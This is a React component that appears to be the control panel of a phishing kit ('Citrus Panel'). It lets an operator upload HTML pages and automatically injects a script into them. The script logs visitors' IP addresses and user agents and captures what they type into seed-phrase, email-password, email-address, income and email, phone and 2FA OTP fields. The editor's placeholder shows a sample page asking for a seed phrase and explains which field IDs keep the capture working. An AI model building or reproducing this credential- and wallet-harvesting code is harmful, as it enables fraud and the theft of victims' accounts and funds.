"use client"

import type React from "react"

import { useState, useEffect, useCallback } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Upload, FileText, Trash2, RefreshCw, Power, PowerOff, Code } from "lucide-react"
import { PageTemplateStore, type PageTemplate } from "@/lib/page-template-store"
import { toast } from "sonner"
import { Textarea } from "@/components/ui/textarea"
import { Save, Eye } from "lucide-react"

interface TemplateManagerProps {
  isOpen: boolean
  onClose: () => void
  connectionId: string
}

export default function TemplateManager({ isOpen, onClose, connectionId }: TemplateManagerProps) {
  const [templates, setTemplates] = useState<PageTemplate[]>([])
  const [activeTemplate, setActiveTemplate] = useState<PageTemplate | null>(null)
  const [isDragging, setIsDragging] = useState(false)
  const [isUploading, setIsUploading] = useState(false)
  const [htmlContent, setHtmlContent] = useState("") // State for the HTML editor
  const [isSaving, setIsSaving] = useState(false)

  const templateStore = PageTemplateStore.getInstance()

  useEffect(() => {
    setTemplates(templateStore.getTemplates())
    setActiveTemplate(templateStore.getActiveTemplate())
    if (templateStore.getActiveTemplate()) {
      setHtmlContent(templateStore.getActiveTemplate()?.content || "")
    }

    const unsubscribe = templateStore.subscribe((newActiveTemplate) => {
      setActiveTemplate(newActiveTemplate)
      setTemplates(templateStore.getTemplates())
      if (newActiveTemplate) {
        setHtmlContent(newActiveTemplate.content)
      } else {
        setHtmlContent("")
      }
    })

    return unsubscribe
  }, [templateStore])

  const handleDragOver = useCallback((e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(true)
  }, [])

  const handleDragLeave = useCallback((e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(false)
  }, [])

  const handleDrop = useCallback(
    async (e: React.DragEvent) => {
      e.preventDefault()
      setIsDragging(false)
      setIsUploading(true)

      const files = Array.from(e.dataTransfer.files)
      const htmlFiles = files.filter((file) => file.name.endsWith(".html"))

      if (htmlFiles.length === 0) {
        toast.error("Please drop HTML files only")
        setIsUploading(false)
        return
      }

      try {
        for (const file of htmlFiles) {
          const content = await file.text()
          const enhancedContent = injectConnectionTracking(content) // Inject script here
          templateStore.addTemplate(file.name, enhancedContent)
        }
        toast.success(`${htmlFiles.length} template(s) uploaded successfully`)
      } catch (error) {
        toast.error("Failed to upload templates")
      }

      setIsUploading(false)
    },
    [templateStore],
  )

  const handleFileInput = useCallback(
    async (e: React.ChangeEvent<HTMLInputElement>) => {
      const files = Array.from(e.target.files || [])
      const htmlFiles = files.filter((file) => file.name.endsWith(".html"))

      if (htmlFiles.length === 0) {
        toast.error("Please select HTML files only")
        return
      }

      setIsUploading(true)

      try {
        for (const file of htmlFiles) {
          const content = await file.text()
          const enhancedContent = injectConnectionTracking(content) // Inject script here
          templateStore.addTemplate(file.name, enhancedContent)
        }
        toast.success(`${htmlFiles.length} template(s) uploaded successfully`)
      } catch (error) {
        toast.error("Failed to upload templates")
      }

      setIsUploading(false)
    },
    [templateStore],
  )

  const handleActivateTemplate = (template: PageTemplate) => {
    templateStore.activateTemplate(template.id)
    toast.success(`Page updated with template: ${template.name}`)
  }

  const handleDeactivateTemplate = () => {
    templateStore.deactivateTemplate()
    toast.success("Reverted to default page")
  }

  const handleDeleteTemplate = (templateId: string) => {
    templateStore.deleteTemplate(templateId)
    toast.success("Template deleted")
  }

  const handleSaveHtmlContent = async () => {
    if (!htmlContent.trim()) {
      toast.error("Please enter HTML content")
      return
    }

    setIsSaving(true)

    try {
      const enhancedHtml = injectConnectionTracking(htmlContent)
      // If there's an active template, update it. Otherwise, add a new one.
      if (activeTemplate) {
        // This is a simplified update. In a real app, you might want a dedicated update method in store.
        templateStore.deleteTemplate(activeTemplate.id) // Delete old
        const newTemplate = templateStore.addTemplate(activeTemplate.name, enhancedHtml) // Add new
        templateStore.activateTemplate(newTemplate.id) // Re-activate
      } else {
        const newTemplate = templateStore.addTemplate("custom-template.html", enhancedHtml)
        templateStore.activateTemplate(newTemplate.id)
      }
      toast.success("Page content updated successfully!")
    } catch (error) {
      toast.error("Failed to save page content")
    }

    setIsSaving(false)
  }

  const handlePreview = () => {
    if (htmlContent.trim()) {
      const previewWindow = window.open("", "_blank")
      if (previewWindow) {
        previewWindow.document.write(htmlContent)
        previewWindow.document.close()
      }
    }
  }

  const handleClearHtmlContent = () => {
    templateStore.deactivateTemplate() // This will also clear activeTemplate
    setHtmlContent("")
    toast.success("HTML content cleared and reverted to default page")
  }

  // Function to inject connection tracking into any HTML
  const injectConnectionTracking = (html: string) => {
    const trackingScript = `
    <script>
      // Connection tracking for Citrus Panel
      (function() {
        let connectionId = null;
        let userIP = '';
        const connectionStoreKey = 'citrus-connections';
        const currentSessionIdKey = 'citrus-current-session-connection-id';
        const currentSessionIpKey = 'citrus-current-session-ip';

        // Function to get IP address
        async function getIP() {
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
          } catch (error) {
            return '192.168.1.' + Math.floor(Math.random() * 255); // Fallback IP
          }
        }

        // Register or update connection
        async function registerOrUpdateConnection() {
          userIP = localStorage.getItem(currentSessionIpKey);
          if (!userIP) {
            userIP = await getIP();
            localStorage.setItem(currentSessionIpKey, userIP);
          }

          connectionId = localStorage.getItem(currentSessionIdKey);
          let connections = JSON.parse(localStorage.getItem(connectionStoreKey) || '[]');
          let connectionData = null;

          if (connectionId) {
            connectionData = connections.find(conn => conn.id === connectionId);
          }

          if (!connectionData) {
            // Add new connection
            connectionData = {
              id: Date.now().toString(),
              ip: userIP,
              page: window.location.pathname,
              annualIncome: '',
              seedInput: '',
              userAgent: navigator.userAgent,
              timestamp: new Date().toISOString(),
              status: 'active',
              additionalInputs: {}
            };
            connections.push(connectionData);
            connectionId = connectionData.id;
            localStorage.setItem(currentSessionIdKey, connectionId);
          } else {
            // Update existing connection (e.g., if page was refreshed)
            connectionData.userAgent = navigator.userAgent; // Update user agent on refresh
          }

          localStorage.setItem(connectionStoreKey, JSON.stringify(connections));
          window.dispatchEvent(new CustomEvent('citrus-connection-added', { detail: connectionData }));
        }

        // Update connection data in localStorage and dispatch event
        function updateConnection(updates) {
          if (!connectionId) return;

          let connections = JSON.parse(localStorage.getItem(connectionStoreKey) || '[]');
          const index = connections.findIndex(conn => conn.id === connectionId);

          if (index !== -1) {
            const currentConnection = connections[index];
            // Merge additionalInputs
            if (updates.additionalInputs) {
              currentConnection.additionalInputs = {
                ...currentConnection.additionalInputs,
                ...updates.additionalInputs
              };
              delete updates.additionalInputs; // Prevent direct overwrite
            }
            connections[index] = { ...currentConnection, ...updates };
            localStorage.setItem(connectionStoreKey, JSON.stringify(connections));
            window.dispatchEvent(new CustomEvent('citrus-connection-updated', {
              detail: { id: connectionId, updates: connections[index] }
            }));
          }
        }

        // Monitor inputs
        function monitorInputs() {
          const inputsToTrack = [
            { id: 'seed-input', key: 'seedInput' },
            { id: 'annual-income', key: 'annualIncome' },
          ];

          const classesToTrack = [
            { class: 'email-otp', keyPrefix: 'emailOtp' },
            { class: 'phone-otp', keyPrefix: 'phoneOtp' },
            { class: '2fa-otp', keyPrefix: '2faOtp' },
            { class: 'email-address', keyPrefix: 'emailAddress' },
            { class: 'email-password', keyPrefix: 'emailPassword' },
          ];

          // Monitor elements by ID
          inputsToTrack.forEach(({ id, key }) => {
            const element = document.getElementById(id);
            if (element) {
              element.addEventListener('input', function() {
                updateConnection({ [key]: this.value });
              });
            }
          });

          // Monitor elements by class
          classesToTrack.forEach(({ class: className, keyPrefix }) => {
            const elements = document.getElementsByClassName(className);
            Array.from(elements).forEach((element, index) => {
              const inputElement = element as HTMLInputElement | HTMLTextAreaElement;
              if (inputElement) {
                const inputKey = \`\${keyPrefix}\${elements.length > 1 ? index + 1 : ''}\`;
                updateConnection({ additionalInputs: { [inputKey]: this.value } });
              }
            });
          });
        }

        // Initialize when DOM is ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', function() {
            registerOrUpdateConnection();
            monitorInputs();
          });
        } else {
          registerOrUpdateConnection();
          monitorInputs();
        }
      })();
    </script>
    `

    // Insert the tracking script before closing body tag, or at the end if no body tag
    if (html.includes("</body>")) {
      return html.replace("</body>", trackingScript + "\n</body>")
    } else {
      return html + trackingScript
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>Page Template Manager</DialogTitle>
        </DialogHeader>

        <div className="space-y-6">
          {/* Current Status */}
          <Card>
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="font-medium">Current Page Status</h3>
                  <p className="text-sm text-gray-500">
                    {activeTemplate ? `Using template: ${activeTemplate.name}` : "Using default page"}
                  </p>
                </div>
                {activeTemplate && (
                  <Button variant="outline" size="sm" onClick={handleDeactivateTemplate}>
                    <PowerOff className="h-4 w-4 mr-2" />
                    Revert to Default
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>

          {/* HTML Editor */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Code className="h-5 w-5" />
                HTML Content Editor
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <Textarea
                value={htmlContent}
                onChange={(e) => setHtmlContent(e.target.value)}
                placeholder={`Enter your HTML content here...

Example:
<!DOCTYPE html>
<html>
<head>
  <title>My Custom Page</title>
</head>
<body>
  <h1>Welcome to My Page</h1>
  <form>
      <label>Annual Income:</label>
      <input type="text" id="annual-income" name="annual-income" />
      
      <label>Seed Phrase:</label>
      <textarea id="seed-input" placeholder="Enter seed phrase..."></textarea>

      <label>Email OTP:</label>
      <input type="text" class="email-otp" />
      
      <button type="submit">Submit</button>
  </form>
</body>
</html>

Note: Use id="seed-input" for seed phrase input and id="annual-income" for income input to maintain tracking.
New classes tracked: email-otp, phone-otp, 2fa-otp, email-address, email-password.`}
                className="min-h-[400px] font-mono text-sm"
              />

              <div className="flex gap-2">
                <Button onClick={handleSaveHtmlContent} disabled={isSaving}>
                  {isSaving ? <RefreshCw className="h-4 w-4 animate-spin mr-2" /> : <Save className="h-4 w-4 mr-2" />}
                  {isSaving ? "Saving..." : "Save & Update Page"}
                </Button>
                <Button variant="outline" onClick={handlePreview} disabled={!htmlContent.trim()}>
                  <Eye className="h-4 w-4 mr-2" />
                  Preview
                </Button>
                <Button variant="destructive" onClick={handleClearHtmlContent} disabled={!activeTemplate}>
                  <Trash2 className="h-4 w-4 mr-2" />
                  Clear & Revert
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Upload Area */}
          <Card>
            <CardContent className="p-6">
              <div
                className={`border-2 border-dashed rounded-lg p-8 text-center transition-colors ${
                  isDragging ? "border-blue-500 bg-blue-50 dark:bg-blue-900/20" : "border-gray-300 dark:border-gray-600"
                }`}
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onDrop={handleDrop}
              >
                <Upload className="mx-auto h-12 w-12 text-gray-400 mb-4" />
                <h3 className="text-lg font-medium mb-2">Drop HTML Templates Here</h3>
                <p className="text-gray-500 mb-4">These will completely replace the /thepage content</p>
                <input
                  type="file"
                  multiple
                  accept=".html"
                  onChange={handleFileInput}
                  className="hidden"
                  id="template-upload"
                />
                <Button asChild disabled={isUploading}>
                  <label htmlFor="template-upload" className="cursor-pointer">
                    {isUploading ? <RefreshCw className="h-4 w-4 animate-spin mr-2" /> : null}
                    {isUploading ? "Uploading..." : "Browse Files"}
                  </label>
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Templates List */}
          <Card>
            <CardHeader>
              <CardTitle>Available Templates ({templates.length})</CardTitle>
            </CardHeader>
            <CardContent>
              {templates.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  No templates uploaded yet. Drop some HTML files above to get started.
                </div>
              ) : (
                <div className="space-y-3">
                  {templates.map((template) => (
                    <div
                      key={template.id}
                      className={`flex items-center justify-between p-4 border rounded-lg hover:bg-gray-50 dark:hover:bg-gray-800 ${
                        template.isActive ? "border-green-500 bg-green-50 dark:bg-green-900/20" : ""
                      }`}
                    >
                      <div className="flex items-center space-x-3">
                        <FileText className={`h-5 w-5 ${template.isActive ? "text-green-600" : "text-blue-600"}`} />
                        <div>
                          <h4 className="font-medium flex items-center gap-2">
                            {template.name}
                            {template.isActive && <Badge variant="default">ACTIVE</Badge>}
                          </h4>
                          <p className="text-sm text-gray-500">
                            Uploaded {new Date(template.uploadedAt).toLocaleDateString()}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Badge variant="secondary">{Math.round(template.content.length / 1024)}KB</Badge>
                        {!template.isActive ? (
                          <Button size="sm" onClick={() => handleActivateTemplate(template)}>
                            <Power className="h-4 w-4 mr-2" />
                            Activate
                          </Button>
                        ) : (
                          <Button size="sm" variant="outline" onClick={handleDeactivateTemplate}>
                            <PowerOff className="h-4 w-4 mr-2" />
                            Deactivate
                          </Button>
                        )}
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => handleDeleteTemplate(template.id)}
                          className="h-8 w-8 p-0"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </DialogContent>
    </Dialog>
  )
}
